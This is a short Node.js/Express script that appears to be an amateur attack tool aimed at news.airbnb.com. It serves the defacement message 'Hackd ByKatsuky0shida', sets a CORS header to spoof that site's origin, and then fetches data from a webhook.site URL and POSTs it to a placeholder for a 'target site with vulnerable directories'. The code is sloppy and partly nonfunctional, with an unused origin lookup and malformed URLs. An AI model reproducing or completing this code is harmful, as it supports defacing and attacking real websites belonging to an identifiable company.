const express = require('express');
const app = express();

const allowedOrigins = ['https://news.airbnb.com//wp-json//akismet//v1', 'https://news.airbnb.com//wp-json//'];

app.get('/', (req, res) => {
  const origin = allowedOrigins.find((domain) => req.headers.origin === domain);
  console.log(origin);
  res.set('Access-Control-Allow-Origin', 'https://news.airbnb.com');
  res.send('Hackd ByKatsuky0shida');
});

app.listen(3000, () => {
  console.log('Server in port 3000');
});

fetch('https://webhook.site/07c9425c-220f-486e-ad40-0baa8e4ccc8b')
  .then(response => response.text())
  .then(data => {
    fetch('site alvo aqui com diretóriovulneráveis', {
      method: 'POST',
      body: data
    }).then(() => console.log('Dados enviados com sucesso para o site alvo'))
      .catch(error => console.error('Erro ao enviar dados para o site alvo:', error));
  }).catch(error => console.error('Erro ao fazer a requisição:', error));
